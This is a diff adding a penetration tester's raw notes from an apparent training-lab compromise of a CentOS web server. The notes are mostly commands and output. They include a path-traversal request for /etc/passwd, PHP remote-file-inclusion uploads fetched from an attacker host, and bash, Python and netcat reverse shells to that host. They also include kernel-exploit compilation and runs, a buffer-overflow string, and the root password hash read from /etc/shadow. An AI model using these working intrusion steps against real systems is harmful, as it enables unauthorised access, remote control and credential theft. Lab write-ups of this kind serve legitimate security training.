@@ -1,0 +1,248 @@
+10.11.1.35 --
+root@7242-alpha-reticuli:/home/cdowns/Security/tgt# nmap 10.11.1.35 -p 443 --script http-methods --script-args http-methods.url-path='/files'
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-13 11:31 CDT
+Nmap scan report for 10.11.1.35
+Host is up (0.031s latency).
+
+PORT    STATE SERVICE
+443/tcp open  https
+| http-methods: 
+|   Supported Methods: GET HEAD POST OPTIONS
+|_  Path tested: /files
+MAC Address: 00:50:56:89:39:1C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
+root@7242-alpha-reticuli:/home/cdowns/Security/tgt# 
+
+
+/etc/passwd --
+GET /section.php?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00bkdocs HTTP/1.1
+
+Upload --
+-- dont work --
+root@7242-alpha-reticuli:/var/www/html# cat fetch.php 
+<?php echo shell_exec("fetch -o /files/payload.php http://10.11.0.203:81/r_shell.php"); ?>
+
+-- works --
+root@7242-alpha-reticuli:/var/www/html# cat wget.php 
+<?php `wget -O /tmp/gotcha.php http://10.11.0.203:81/simple.php`; ?>
+root@7242-alpha-reticuli:/var/www/html# cat tmp.php 
+<?php echo (`ls -l /tmp/`); ?>
+root@7242-alpha-reticuli:/var/www/html# 
+
+verify --
+https://10.11.1.35/section.php?page=http://10.11.0.203:81/tmp.php?
+gotcha.php exists !
+
+Create the shell --
+-- php -f index.php -- -o myshell.php -p gotcha -s -b -z gzcompress -c 9
+
+Lets attempt to upload --
+root@7242-alpha-reticuli:/var/www/html/b374k# cat ../wget.php 
+<?php `wget -O /tmp/myshell.php http://10.11.0.203:81/myshell.php`; ?>
+root@7242-alpha-reticuli:/var/www/html/b374k# 
+
+Requesting --
+https://10.11.1.35/section.php?page=http://10.11.0.203:81/wget.php?
+https://10.11.1.35/section.php?page=http://10.11.0.203:81/tmp.php?
+
+!! SHELL VICTORY !!
+./kadimus -t https://10.11.1.35/section.php?page=php://input%00 -C \ '<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.203/1337 0>&1 2>&1"); ?>' -X input
+
+root@7242-alpha-reticuli:/var/www/html# nc -lvp 1337
+listening on [any] 1337 ...
+10.11.1.35: inverse host lookup failed: Unknown host
+connect to [10.11.0.203] from (UNKNOWN) [10.11.1.35] 46402
+bash: no job control in this shell
+bash-3.1$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-3.1$ uname -a
+Linux pain 2.6.18-274.3.1.el5 #1 SMP Tue Sep 6 20:14:03 EDT 2011 i686 i686 i386 GNU/Linux
+bash-3.1$ cat /etc/redhat-release
+CentOS release 5 (Final)
+bash-3.1$
+
+BINGO !
+
+bash-3.1$ wget -c http://10.11.0.203:81/linuxprivchecker.py
+--16:19:15--  http://10.11.0.203:81/linuxprivchecker.py
+Connecting to 10.11.0.203:81... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 25304 (25K) [text/x-python]
+--16:19:16--  (try: 2)  http://10.11.0.203:81/linuxprivchecker.py
+Reusing existing connection to 10.11.0.203:81.
+HTTP request sent, awaiting response... 200 OK
+Length: 25304 (25K) [text/x-python]
+Saving to: `linuxprivchecker.py'
+
+     0K .......... .......... ....                            100%  703K=0.04s
+
+16:19:16 (703 KB/s) - `linuxprivchecker.py' saved [25304/25304]
+
+bash-3.1$ 
+
+Run linuxprivchecker.py --
+NO GCC / MAKE Exists.
+Download CentOS 5.11 ( Final ) for exploit compilation. Will set up on a VirtualBox VM.
+http://archive.kernel.org/centos-vault/5.11/isos/x86_64/
+
+Verify Selinux State --
+bash-3.1$ cat /etc/sysconfig/selinux | grep -v "#"
+cat /etc/sysconfig/selinux | grep -v "#"
+SELINUX=disabled
+SELINUXTYPE=targeted
+bash-3.1$ 
+
+
+Attempting to modify kadimus to use shelshock / sudo -s -> root --
+./kadimus -t https://10.11.1.35/section.php?page=php://input%00 -C \ '<?php echo shell_exec("{ :; }; bash -i >& /dev/tcp/10.11.0.203/1337 0>&1 2>&1"); ?>' -X input
+Get a shell no sudo no tty
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+export SHELL=bash
+
+
+Hunting for a rwx directory to use for sploit --
+find / -user apache -perm -u=rwx -type d 2>/dev/null
+/var/cache/mod_ssl
+/var/cache/mod_proxy
+/var/lib/dav
+bash-3.1$ 
+
+setfacl -Rm d:u:apache:rwx mod_proxy/
+
+bash-3.1$ getfacl mod_proxy
+getfacl mod_proxy
+# file: mod_proxy
+# owner: apache
+# group: apache
+user::rwx
+group::rwx
+other::rwx
+default:user::rwx
+default:user:apache:rwx
+default:group::rwx
+default:mask::rwx
+default:other::rwx
+
+Copied /bin/cat into adjusted EXEC dir --
+Works as it should. Checking build --
+bash-3.1$ file cat
+file cat
+cat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.9, dynamically linked (uses shared libs), for GNU/Linux 2.6.9, stripped
+bash-3.1$ 
+
+Pre compile Exploit on remote VM 32Bit --
+[cdowns@centos5 Downloads]$ gcc -m32 -pthread dirty.c -o dirty -lcrypt
+[cdowns@centos5 Downloads]$ file dirty
+dirty: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.9, dynamically linked (uses shared libs), not stripped
+[cdowns@centos5 Downloads]$
+
+Pre-Compiled Exploit on target system --
+
+bash-3.1$ ls -l dirty
+ls -l dirty
+-rw-rw-rw-+ 1 apache apache 9204 Mar 14 12:54 dirty
+bash-3.1$ file dirty
+file dirty
+dirty: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.9, dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+bash-3.1$ 
+
+Cross fingers !! --
+bash-3.1$ ./dirty
+./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter new password: pwned
+
+Complete line:
+pwned:fikSWtrwkeODg:0:0:pwned:/root:/bin/bash
+
+mmap: b7f48000
+
+
+Verify Sploit worked / Check md5sums --
+Couldnt write to /tmp / modified exploit output to /var/cache/mod_proxy / recompiled
+Trying again --
+
+FUCKING FAILED !
+bash-3.1$ md5sum passwd.bak /etc/passwd
+md5sum passwd.bak /etc/passwd
+79ad360ddc2067e4bc5bf3799a4dc685  passwd.bak
+79ad360ddc2067e4bc5bf3799a4dc685  /etc/passwd
+bash-3.1$ 
+
+Ok. Exploit check time again ! --
+bash-3.1$ perl Linux_Exploit_Suggester.pl
+perl Linux_Exploit_Suggester.pl
+
+Kernel local: 2.6.18
+
+Searching among 65 exploits...
+
+Possible Exploits:
+******************************
+-- Snip --
+
+As we keep going and nothing is working.... possible --
+https://git.zx2c4.com/CVE-2012-0056/about/
+
+Mempodipper
+[cdowns@centos5 Downloads]$ vim 18411.c 
+[cdowns@centos5 Downloads]$ objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\([^0]*\)/0x\1/'
+0x1c90
+[cdowns@centos5 Downloads]$ 
+
+
+
+Reverse Python Shell --
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.203",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])';
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+Kernel 2.4.x/2.6.x: https://www.exploit-db.com/exploits/9545/ - compile as: gcc -Wall -o 9545 9545.c -Wl,--hash-style=both
+Add gcc -m32 --
+[cdowns@centos5 Downloads]$ gcc -m32 -Wall -o 9545 9545.c -Wl,--hash-style=both
+9545.c:376:28: warning: no newline at end of file
+[cdowns@centos5 Downloads]$ file 9545
+9545: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.9, dynamically linked (uses shared libs), not stripped
+[cdowns@centos5 Downloads]$ 
+
+hostname && uname -a ; id ; echo $SHELL
+python -c 'import pty;pty.spawn("/bin/bash")'
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;export TERM=xterm;export SHELL=bash
+find / -user apache -perm -u=rwx -type d 2>/dev/null
+cd /var/cache/mod_proxy
+curl -OOOO http://10.11.0.203:81/{libno_ex.so.1.0,program.o,suid,udev}
+chmod 775 suid;chmod 775 udev;chmod 775 libno_ex.so.1.0;chmod 664 program.o
+cat /proc/net/netlink | grep ffffffff
+
+/bin/sh 0</tmp/backpipe | nc 10.11.0.203 443 1>/tmp/backpipe
+
+cd /var/tmp
+curl -OOOO http://10.11.0.203:81/{libno_ex.so.1.0,run,suid,udev}
+chmod 755 {libno_ex.so.1.0,run,suid,udev}
+cat /proc/net/netlink | grep fff | awk {'print $3'}
+mknod /var/tmp/backpipe p
+/bin/sh -c "/bin/sh 0</var/tmp/backpipe | nc 10.11.0.203 1338 1>/var/tmp/backpipe"
+
+apache   13162 13153  0 Mar21 pts/12   00:00:00 /bin/sh ./sudoedit
+root     13164 13162  0 Mar21 pts/12   00:00:00 /bin/su
+
+
+sudo nc -lvlp 443
+
+ASLR bypass -
+$(perl -e 'print "A" x 112 . "\x7d\x38\x40\x80" . "B" x 36')
+
+-- https://www.exploit-db.com/exploits/15274/
+bash-3.1# cat /etc/shadow | grep root
+cat /etc/shadow | grep root
+root:$1$HyOQzA.9$nshWFr/.e9Pcy3xhw8Ib6/:16902:0:99999:7:::
+bash-3.1# 
+
+
+proof:
+3f7d652a3efb59d0631771f65c65ba07
+
+
